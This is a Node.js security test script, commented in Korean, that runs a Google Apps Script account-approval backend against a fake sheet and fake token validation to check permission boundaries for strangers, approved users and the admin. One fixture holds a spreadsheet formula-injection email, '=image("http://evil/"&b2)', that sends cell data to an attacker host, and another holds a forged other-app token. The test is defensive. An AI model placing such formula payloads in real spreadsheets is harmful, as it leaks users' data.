#!/usr/bin/env node
// 접속 승인·스크립트 권한 검증 — _downloads/AppsScript_계정관리_arui114501.js 를 **그대로** 가짜 시트·가짜 tokeninfo 위에서
//   실행해, 토큰 없는 호출·다른 앱 토큰·낯선 계정·승인 사용자·관리자의 권한 경계를 기계로 확인한다(미러 금지 — 원본 실행).
//   이 검증이 생긴 이유(2026-11-05): OAuth 앱을 '프로덕션'으로 게시하자 누구나 구글 로그인을 통과했고, 스크립트에는
//   호출자 확인이 없어 '승인 요청' 버튼(addUser)이 곧 자동 승인이었다. 주소를 아는 사람은 명단 조회·삭제·기능 켜기도 됐다.
//   파트③은 사이트 쪽 배선 — 모든 스크립트 호출이 src/appsScript.ts(토큰을 싣는 단일 관문)를 지나는지 본다.
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { createHash, randomUUID } from 'node:crypto';
import vm from 'node:vm';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
let pass = 0, fail = 0;
const ok = (name, cond) => { if (cond) { pass++; console.log(`  ✓ ${name}`); } else { fail++; console.log(`  ✗ ${name}`); } };
const eq = (name, got, want) => ok(`${name} (got ${JSON.stringify(got)})`, JSON.stringify(got) === JSON.stringify(want));

const SCRIPT_PATH = join(ROOT, '_downloads/AppsScript_계정관리_arui114501.js');
const SRC = readFileSync(SCRIPT_PATH, 'utf8');
const CONFIG = readFileSync(join(ROOT, 'src/config.ts'), 'utf8');
const cfg = (name) => (CONFIG.match(new RegExp(`export const ${name} = '([^']+)'`)) || [])[1];
const sconst = (name) => (SRC.match(new RegExp(`const ${name}\\s*=\\s*'([^']+)'`)) || [])[1];

const CLIENT_ID = cfg('GOOGLE_CLIENT_ID');
const ADMIN = cfg('ADMIN_EMAIL');

// ── 가짜 Apps Script 런타임 ──
function makeRuntime() {
  const sheets = {};
  const mkSheet = (name, rows) => {
    const s = {
      name, rows,
      getDataRange: () => ({ getValues: () => s.rows.map(r => r.slice()) }),
      appendRow: (row) => { s.rows.push(row.slice()); },
      deleteRow: (i) => { s.rows.splice(i - 1, 1); },
      deleteRows: (start, n) => { s.rows.splice(start - 1, n); },
      getLastRow: () => s.rows.length,
      getRange: (r, c) => {
        if (typeof r === 'string') {
          if (r === 'E1:N1') return { getValues: () => [s.rows[0].slice(4, 14)] };
          throw new Error('A1 표기 미지원: ' + r);
        }
        return {
          setValue: (v) => { while (s.rows.length < r) s.rows.push([]); s.rows[r - 1][c - 1] = v; },
          getValue: () => (s.rows[r - 1] || [])[c - 1],
        };
      },
    };
    sheets[name] = s;
    return s;
  };
  const OFF10 = Array(10).fill('OFF');
  mkSheet('approved_users', [
    ['RESET', 'email', 'name', 'registeredAt', '기능1', '기능2', '기능3', '유튜브', '학습자료', '시장리포트', '자금흐름도', '백테스트', '가계부', '금리'],
    ['', ADMIN, '관리자', '2026-01-01', ...OFF10],
    ['RESET:4321', 'user@gmail.com', '사용자', '2026-02-01', 'ON', ...OFF10.slice(1)],
    ['', 'other@gmail.com', '다른이', '2026-03-01', ...OFF10],
  ]);
  mkSheet('settings', [['key', 'value'], ['youtubeUrl', 'https://youtu.be/x'], ['reportLinks', '[]']]);
  mkSheet('notifications', [
    ['id', 'targetEmail', 'message', 'type', 'createdAt'],
    ['n1', '__all__', '전체 공지', 'info', 1],
    ['n2', 'user@gmail.com', '사용자 개인 공지', 'info', 2],
    ['n3', 'other@gmail.com', '다른이 개인 공지', 'info', 3],
    ['n4', '__notebook__', '학습자료 공지', 'info', 4],
  ]);

  const TOKENS = {
    'tok-admin-xxxxxxxxxxxxxxxx':    { aud: CLIENT_ID, email: ADMIN, email_verified: 'true', expires_in: '3500' },
    'tok-user-xxxxxxxxxxxxxxxxx':    { aud: CLIENT_ID, email: 'User@Gmail.com', email_verified: 'true', expires_in: '3500' },
    'tok-other-xxxxxxxxxxxxxxxx':    { aud: CLIENT_ID, email: 'other@gmail.com', email_verified: 'true', expires_in: '3500' },
    'tok-stranger-xxxxxxxxxxxxx':    { aud: CLIENT_ID, email: 'stranger@gmail.com', email_verified: 'true', expires_in: '3500' },
    'tok-otherapp-xxxxxxxxxxxxx':    { aud: 'evil.apps.googleusercontent.com', email: ADMIN, email_verified: 'true', expires_in: '3500' },
    'tok-unverified-xxxxxxxxxxx':    { aud: CLIENT_ID, email: 'nov@gmail.com', email_verified: 'false', expires_in: '3500' },
    'tok-formula-xxxxxxxxxxxxxx':    { aud: CLIENT_ID, email: '=image("http://evil/"&b2)@x.com', email_verified: 'true', expires_in: '3500' },
    'tok-noemail-xxxxxxxxxxxxxx':    { aud: CLIENT_ID, email_verified: 'true', expires_in: '3500' },
    'tok-expired-xxxxxxxxxxxxxx':    { aud: CLIENT_ID, email: 'user@gmail.com', email_verified: 'true', expires_in: '0' },
  };
  for (let i = 0; i < 40; i++) TOKENS[`tok-many-${String(i).padStart(18, '0')}`] = { aud: CLIENT_ID, email: `m${i}@gmail.com`, email_verified: 'true', expires_in: '3500' };

  const state = { fetches: 0, mails: [], cache: new Map(), props: new Map() };
  const ctx = {
    console,
    SpreadsheetApp: {
      openById: () => ({
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => mkSheet(n, []),
      }),
      newDataValidation: () => { throw new Error('미지원'); },
    },
    UrlFetchApp: {
      fetch: (url) => {
        state.fetches++;
        const tok = decodeURIComponent((url.match(/access_token=([^&]*)/) || [])[1] || '');
        const info = TOKENS[tok];
        return { getResponseCode: () => (info ? 200 : 400), getContentText: () => JSON.stringify(info || { error: 'invalid_token' }) };
      },
    },
    CacheService: { getScriptCache: () => ({ get: (k) => (state.cache.has(k) ? state.cache.get(k) : null), put: (k, v) => { state.cache.set(k, v); } }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (state.props.has(k) ? state.props.get(k) : null), setProperty: (k, v) => { state.props.set(k, v); } }) },
    LockService: { getScriptLock: () => ({ tryLock: () => true, waitLock: () => {}, releaseLock: () => {} }) },
    MailApp: { sendEmail: (m) => { state.mails.push(m); }, getRemainingDailyQuota: () => 100 },
    Utilities: {
      formatDate: (d, tz, fmt) => (fmt.includes('HH') ? '2026-11-05 12:00:00' : '2026-11-05'),
      getUuid: () => randomUUID(),
      DigestAlgorithm: { SHA_256: 'sha256' },
      computeDigest: (alg, s) => Array.from(createHash('sha256').update(String(s)).digest()),
      base64EncodeWebSafe: (bytes) => Buffer.from(bytes).toString('base64url'),
    },
    ContentService: { createTextOutput: (s) => ({ setMimeType: () => ({ body: s }) }), MimeType: { JSON: 'json' } },
    Logger: { log: () => {} },
  };
  vm.createContext(ctx);
  vm.runInContext(SRC, ctx, { filename: 'AppsScript.js' });
  const doPost = vm.runInContext('doPost', ctx);
  const doGet = vm.runInContext('doGet', ctx);
  const post = (body) => JSON.parse(doPost({ postData: { contents: JSON.stringify(body) } }).body);
  const get = (params) => JSON.parse(doGet({ parameter: params }).body);
  const MAX_PENDING = vm.runInContext('MAX_PENDING', ctx);
  const MAIL_DAILY_CAP = vm.runInContext('MAIL_DAILY_CAP', ctx);
  const AUDIT_MAX_ROWS = vm.runInContext('AUDIT_MAX_ROWS', ctx);
  return { sheets, state, post, get, MAX_PENDING, MAIL_DAILY_CAP, AUDIT_MAX_ROWS };
}

const T = {
  admin: 'tok-admin-xxxxxxxxxxxxxxxx', user: 'tok-user-xxxxxxxxxxxxxxxxx', other: 'tok-other-xxxxxxxxxxxxxxxx',
  stranger: 'tok-stranger-xxxxxxxxxxxxx', otherapp: 'tok-otherapp-xxxxxxxxxxxxx', unverified: 'tok-unverified-xxxxxxxxxxx',
  formula: 'tok-formula-xxxxxxxxxxxxxx', noemail: 'tok-noemail-xxxxxxxxxxxxxx', expired: 'tok-expired-xxxxxxxxxxxxxx',
};
const emails = (sheet) => sheet.rows.slice(1).map(r => String(r[1] || '').toLowerCase());
const reqRows = (sheets) => (sheets.access_requests ? sheets.access_requests.rows.slice(1) : []);

console.log('\n── 파트① 설정 일치(사이트 ↔ 스크립트) ──');
eq('#C1 CLIENT_ID = config.GOOGLE_CLIENT_ID', sconst('CLIENT_ID'), CLIENT_ID);
eq('#C2 ADMIN_EMAIL = config.ADMIN_EMAIL', sconst('ADMIN_EMAIL'), ADMIN);
eq('#C3 SHEET_ID = config.APPROVED_SHEET_ID', sconst('SHEET_ID'), cfg('APPROVED_SHEET_ID'));
ok('#C4 tokeninfo로 aud(이 앱) 확인', /info\.aud !== CLIENT_ID/.test(SRC));

console.log('\n── 파트② 권한 경계(원본 스크립트 실행) ──');
{
  const { sheets, state, post, get } = makeRuntime();
  const ADMIN_ONLY = ['listUsers', 'listRequests', 'approveRequest', 'rejectRequest', 'deleteRequest', 'removeUser', 'setSettings', 'setUserFeature', 'sendNotification', 'deleteNotification', 'deleteAllNotifications', 'listAudit'];
  const before = JSON.stringify(sheets.approved_users.rows);

  // GET — 사용자 정보 0
  const g = get({ action: 'check', email: 'user@gmail.com' });
  eq('#G1 GET check → 상태 한 줄만(승인·기능·리셋 비노출)', g, { status: 'ok' });
  eq('#G2 GET listUsers → 상태 한 줄만', get({ action: 'listUsers' }), { status: 'ok' });

  // 토큰 없음·가짜·다른 앱·미확인·수식 이메일·만료
  for (const [label, token] of [['토큰 없음', undefined], ['가짜 토큰', 'not-a-real-token-xxxxxxxx'], ['다른 앱 토큰(관리자 이메일)', T.otherapp], ['이메일 미확인', T.unverified], ['수식 모양 이메일', T.formula], ['이메일 범위 없음', T.noemail], ['만료 토큰', T.expired]]) {
    const r1 = post({ action: 'check', token });
    const r2 = post({ action: 'listUsers', token });
    const r3 = post({ action: 'requestAccess', token });
    const r4 = post({ action: 'setUserFeature', token, email: 'user@gmail.com', feature: 'feature1', value: false });
    ok(`#A ${label} → check·listUsers·requestAccess·setUserFeature 전부 authError`, [r1, r2, r3, r4].every(r => r.authError === true && !r.users));
  }
  eq('#A8 옛 승인 요청(addUser, 토큰 없음) → authError', post({ action: 'addUser', email: 'evil@gmail.com' }).authError, true);
  eq('#A9 옛 구버전 요청(action 없이 email) → authError', post({ email: 'evil@gmail.com' }).authError, true);
  eq('#A10 지금까지 승인 명단 불변', JSON.stringify(sheets.approved_users.rows), before);

  // 낯선 계정
  eq('#S1 낯선 계정 check → 미승인·요청 전', post({ action: 'check', token: T.stranger }), { status: 'not_approved', request: 'none' });
  const sc = post({ action: 'check', token: T.stranger, email: 'user@gmail.com' });
  ok('#S2 낯선 계정이 남의 이메일로 check → 자기 상태만(남의 리셋 비번 비노출)', sc.status === 'not_approved' && sc.resetPassword === undefined);
  for (const a of ['getSettings', 'getNotifications', 'getFeatureLabels', ...ADMIN_ONLY, 'addUser']) {
    const r = post({ action: a, token: T.stranger, email: 'stranger@gmail.com', feature: 'feature1', value: true, key: 'youtubeUrl', value2: 'x', message: 'm', notifId: 'n1' });
    ok(`#S3 낯선 계정 ${a} → forbidden`, r.forbidden === true && r.success === false && !r.users && !r.notifications && !r.requests);
  }
  eq('#S4 낯선 계정이 시도해도 승인 명단 불변', JSON.stringify(sheets.approved_users.rows), before);
  eq('#S5 공지 시트 불변(4건)', sheets.notifications.rows.length - 1, 4);

  const rq = post({ action: 'requestAccess', token: T.stranger });
  eq('#R1 승인 요청 → 대기(pending)', rq, { success: true, status: 'pending' });
  ok('#R2 승인 명단에는 들어가지 않음', !emails(sheets.approved_users).includes('stranger@gmail.com'));
  eq('#R3 access_requests에 PENDING 1줄', reqRows(sheets).map(r => [r[0], r[3]]), [['stranger@gmail.com', 'PENDING']]);
  eq('#R4 관리자 메일 1통', state.mails.map(m => m.to), [ADMIN]);
  eq('#R5 요청 뒤 check → 미승인·대기', post({ action: 'check', token: T.stranger }), { status: 'not_approved', request: 'pending' });
  eq('#R6 다시 요청 → 중복 줄·메일 없음', [post({ action: 'requestAccess', token: T.stranger }).status, reqRows(sheets).length, state.mails.length], ['pending', 1, 1]);
  ok('#R7 대기 중에도 getSettings 거부', post({ action: 'getSettings', token: T.stranger }).forbidden === true);

  // 승인 사용자
  const uc = post({ action: 'check', token: T.user });
  ok('#U1 승인 사용자 check → approved + 기능 + 본인 리셋 비번', uc.status === 'approved' && uc.feature1 === true && uc.rateEnabled === false && uc.resetPassword === '4321');
  const uo = post({ action: 'check', token: T.user, email: 'other@gmail.com' });
  ok('#U2 승인 사용자가 남의 이메일로 check → 자기 줄만', uo.name === '사용자');
  ok('#U3 승인 사용자 getSettings 통과', post({ action: 'getSettings', token: T.user }).youtubeUrl === 'https://youtu.be/x');
  eq('#U4 공지는 전체·묶음·본인 것만(다른 사용자 이메일 비노출)', post({ action: 'getNotifications', token: T.user }).notifications.map(n => n.id), ['n1', 'n2', 'n4']);
  for (const a of ADMIN_ONLY) {
    const r = post({ action: a, token: T.user, email: 'user@gmail.com', feature: 'feature2', value: true, key: 'youtubeUrl', message: 'm', notifId: 'n3', targetEmail: '__all__' });
    ok(`#U5 승인 사용자 ${a} → forbidden`, r.forbidden === true && !r.users && !r.requests && !r.entries);
  }
  eq('#U6 승인 사용자가 시도해도 명단·공지 불변', [JSON.stringify(sheets.approved_users.rows) === before, sheets.notifications.rows.length - 1], [true, 4]);
  eq('#U7 clearReset → 본인 리셋 플래그만 지움', [post({ action: 'clearReset', token: T.user, email: 'other@gmail.com' }).success, sheets.approved_users.rows[2][0]], [true, '']);
  const denied = (sheets.audit_log?.rows || []).filter(r => String(r[4]).startsWith('권한 없음'));
  ok('#U8 권한 없는 시도는 보안 기록에 남음', denied.some(r => r[1] === 'stranger@gmail.com') && denied.some(r => r[1] === 'user@gmail.com'));
  const n0 = sheets.audit_log.rows.length;
  post({ action: 'listUsers', token: T.user });
  eq('#U9 같은 계정·같은 거부는 10분에 한 줄(도배 방지)', sheets.audit_log.rows.length, n0);

  // 관리자
  ok('#M1 관리자 listUsers', post({ action: 'listUsers', token: T.admin }).users.length === 3);
  eq('#M2 관리자 listRequests', post({ action: 'listRequests', token: T.admin }).requests.map(r => [r.email, r.status]), [['stranger@gmail.com', 'PENDING']]);
  eq('#M3 관리자 공지 전체', post({ action: 'getNotifications', token: T.admin }).notifications.length, 4);
  eq('#M4 관리자 접속(남의 check) → 대상 줄', post({ action: 'check', token: T.admin, email: 'other@gmail.com' }).name, '다른이');
  eq('#M5 승인 → 성공', post({ action: 'approveRequest', token: T.admin, email: 'stranger@gmail.com' }).success, true);
  const added = sheets.approved_users.rows.find(r => r[1] === 'stranger@gmail.com');
  eq('#M6 승인 줄 = 14칸 · 기능 10개 전부 OFF', [added?.length, added?.slice(4).every(v => v === 'OFF')], [14, true]);
  eq('#M7 승인 뒤 요청 줄 삭제', reqRows(sheets).length, 0);
  eq('#M8 승인 뒤 check → approved', post({ action: 'check', token: T.stranger }).status, 'approved');
  eq('#M9 기능 켜기', [post({ action: 'setUserFeature', token: T.admin, email: 'stranger@gmail.com', feature: 'rateEnabled', value: true }).success, post({ action: 'check', token: T.stranger }).rateEnabled], [true, true]);
  eq('#M10 없는 기능 키 거부', post({ action: 'setUserFeature', token: T.admin, email: 'stranger@gmail.com', feature: 'admin', value: true }).success, false);
  eq('#M11 설정 키 허용 목록 유지', post({ action: 'setSettings', token: T.admin, key: 'evil', value: 'x' }).success, false);
  eq('#M12 관리자 자신은 승인 취소 불가', post({ action: 'removeUser', token: T.admin, email: ADMIN }).success, false);
  eq('#M13 승인 취소 → 명단에서 삭제', [post({ action: 'removeUser', token: T.admin, email: 'stranger@gmail.com' }).success, emails(sheets.approved_users).includes('stranger@gmail.com')], [true, false]);
  eq('#M14 승인 취소된 계정 → 거절 상태·다시 요청 불가·메일 없음', [post({ action: 'check', token: T.stranger }).request, post({ action: 'requestAccess', token: T.stranger }).status, state.mails.length], ['rejected', 'rejected', 1]);
  eq('#M15 기록 지우기 → 다시 요청 가능', [post({ action: 'deleteRequest', token: T.admin, email: 'stranger@gmail.com' }).success, post({ action: 'requestAccess', token: T.stranger }).status], [true, 'pending']);
  eq('#M16 거절 → rejected', [post({ action: 'rejectRequest', token: T.admin, email: 'stranger@gmail.com' }).success, post({ action: 'check', token: T.stranger }).request], [true, 'rejected']);
  ok('#M17 보안 기록 조회(최신순)', (() => { const e = post({ action: 'listAudit', token: T.admin, limit: 5 }).entries; return e.length === 5 && e[0].action === 'rejectRequest'; })());
  eq('#M18 알 수 없는 동작', post({ action: 'nope', token: T.admin }).success, false);

  const f0 = state.fetches;
  post({ action: 'check', token: T.admin }); post({ action: 'check', token: T.admin });
  eq('#K1 같은 토큰은 tokeninfo를 다시 부르지 않음(캐시)', state.fetches, f0);
}

console.log('\n── 파트②-b 상한(대기 요청·메일·보안 기록) ──');
{
  const { sheets, state, post, MAX_PENDING, MAIL_DAILY_CAP, AUDIT_MAX_ROWS } = makeRuntime();
  const results = [];
  for (let i = 0; i < 40; i++) results.push(post({ action: 'requestAccess', token: `tok-many-${String(i).padStart(18, '0')}` }));
  eq('#L1 대기 요청 상한', reqRows(sheets).filter(r => r[3] === 'PENDING').length, MAX_PENDING);
  ok('#L2 상한 넘은 요청은 실패로 답함', results.slice(MAX_PENDING).every(r => r.success === false));
  eq('#L3 메일은 하루 상한까지만', state.mails.length, MAIL_DAILY_CAP);
  for (let i = 0; i < AUDIT_MAX_ROWS + 300; i++) post({ action: 'sendNotification', token: T.admin, targetEmail: '__all__', message: 'x' + i });
  ok('#L4 보안 기록은 상한 근처로 잘림', sheets.audit_log.rows.length - 1 <= AUDIT_MAX_ROWS + 200);
}

console.log('\n── 파트③ 사이트 배선(src) ──');
{
  const walk = (d) => readdirSync(d).flatMap(f => { const p = join(d, f); return statSync(p).isDirectory() ? walk(p) : [p]; });
  const files = walk(join(ROOT, 'src')).filter(f => /\.(ts|tsx)$/.test(f));
  const rel = (f) => f.slice(ROOT.length + 1).replace(/\\/g, '/');
  const bad = files.filter(f => !/src[\\/](appsScript|config)\.ts$/.test(f) && /\bAPPS_SCRIPT_URL\b/.test(readFileSync(f, 'utf8')));
  eq('#W1 APPS_SCRIPT_URL은 appsScript.ts·config.ts에만', bad.map(rel), []);
  const missingImport = files.filter(f => { const s = readFileSync(f, 'utf8'); return /\bcallScript\(/.test(s) && !/src[\\/]appsScript\.ts$/.test(f) && !/import\s*\{[^}]*\bcallScript\b[^}]*\}\s*from\s*'(\.\.?\/)+appsScript'/.test(s); });
  eq('#W2 callScript 쓰는 파일은 전부 import', missingImport.map(rel), []);
  const all = files.map(f => readFileSync(f, 'utf8')).join('\n');
  ok('#W3 옛 자동 승인 호출(addUser) 없음', !/callScript\(\s*'addUser'/.test(all) && !/action:\s*'addUser'/.test(all));
  const AS = readFileSync(join(ROOT, 'src/appsScript.ts'), 'utf8');
  ok('#W4 appsScript.ts — 본문에 token 실음 · POST text/plain', /body:\s*JSON\.stringify\(\{\s*\.\.\.params,\s*action,\s*token\s*\}\)/.test(AS) && /method:\s*'POST'/.test(AS) && /'Content-Type':\s*'text\/plain'/.test(AS));
  const LG = readFileSync(join(ROOT, 'src/components/LoginGate.tsx'), 'utf8');
  ok('#W5 LoginGate — 승인 요청은 requestAccess', /callScript\('requestAccess'/.test(LG));
  ok('#W6 LoginGate — check는 토큰을 넘김(세 경로)', (LG.match(/checkApproval\(token\)/g) || []).length === 2 && /checkApproval\(adminViewUserCtx\.adminToken, adminViewUserCtx\.userEmail\)/.test(LG));
  const APP = readFileSync(join(ROOT, 'src/App.tsx'), 'utf8');
  ok('#W7 App — registerScriptAuth(로그인 토큰) 등록 + import', /registerScriptAuth\(\(\) => driveTokenRef\.current/.test(APP) && /import\s*\{[^}]*\bregisterScriptAuth\b[^}]*\}\s*from\s*'\.\/appsScript'/.test(APP));
  ok('#W8 App — 부팅 getSettings는 error 응답으로 덮지 않음', /settingsData && !settingsData\.error/.test(APP));
  const AP = readFileSync(join(ROOT, 'src/components/AdminPage.tsx'), 'utf8');
  ok('#W9 AdminPage — 승인 대기(승인·거절)·승인 취소·보안 기록', ['approveRequest', 'rejectRequest', 'deleteRequest', "callScript('removeUser'", "callScript('listAudit'", "callScript('listRequests'"].every(k => AP.includes(k)));
}

console.log(`\n결과: ${pass} 통과 / ${fail} 실패`);
process.exit(fail ? 1 : 0);
